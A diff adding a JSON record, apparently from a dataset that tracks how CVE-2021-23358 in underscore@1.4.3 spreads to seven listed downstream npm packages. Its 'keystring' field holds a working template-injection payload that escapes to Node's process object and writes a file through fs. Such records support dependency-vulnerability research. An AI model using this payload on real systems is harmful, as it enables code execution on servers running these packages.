@@ -1,0 +1,16 @@
+{
+  "id": "CVE-2021-23358",
+  "upstream": "underscore@1.4.3",
+  "keymethod": "variable",
+  "keystring": "a = this.constructor.constructor(`return process`)().mainModule.require(`fs`).writeFileSync(`underscore`,``)",
+  "location": "modules/template.js:71:14",
+  "downstreams": [
+    "jscov@0.2.0",
+    "dyndb@0.1.0",
+    "exp@0.1.0",
+    "backbone-sdb@0.1.0",
+    "nestor@0.1.0",
+    "backbone-dynamodb@0.1.0",
+    "protos@0.3.3"
+  ]
+}
